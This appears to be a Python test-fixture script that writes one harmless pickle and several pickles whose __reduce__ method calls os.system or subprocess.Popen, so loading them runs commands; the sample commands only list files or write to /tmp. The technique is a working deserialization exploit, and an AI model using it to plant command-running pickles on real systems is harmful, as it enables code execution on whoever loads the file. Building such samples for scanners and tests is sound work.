
import pickle
import os
import subprocess

def create_malicious_pickle(filename, payload):
    class Exploit(object):
        def __reduce__(self):
            return (os.system, (payload,))

    with open(filename, "wb") as f:
        pickle.dump(Exploit(), f)

def create_malicious_subprocess_pickle(filename, payload):
    class ExploitSubprocess(object):
        def __reduce__(self):
            return (subprocess.Popen, (payload,))

    with open(filename, "wb") as f:
        pickle.dump(ExploitSubprocess(), f)

def create_harmless_pickle(filename):
    data = {"key": "value", "number": 123}
    with open(filename, "wb") as f:
        pickle.dump(data, f)

if __name__ == "__main__":
    # Harmless pickle
    create_harmless_pickle("harmless.pkl")

    # Malicious pickles using os.system
    create_malicious_pickle("malicious_ls.pkl", "ls -la")
    create_malicious_pickle("malicious_touch.pkl", "touch /tmp/malicious_file")
    create_malicious_pickle("malicious_echo.pkl", "echo \"malicious payload\" > /tmp/malicious_output.txt")

    # Malicious pickles using subprocess.Popen
    create_malicious_subprocess_pickle("malicious_subprocess_ls.pkl", ["ls", "-la"])
    create_malicious_subprocess_pickle("malicious_subprocess_touch.pkl", ["touch", "/tmp/malicious_file_subprocess"])

    print("Generated harmless.pkl, malicious_ls.pkl, malicious_touch.pkl, malicious_echo.pkl, malicious_subprocess_ls.pkl, malicious_subprocess_touch.pkl")


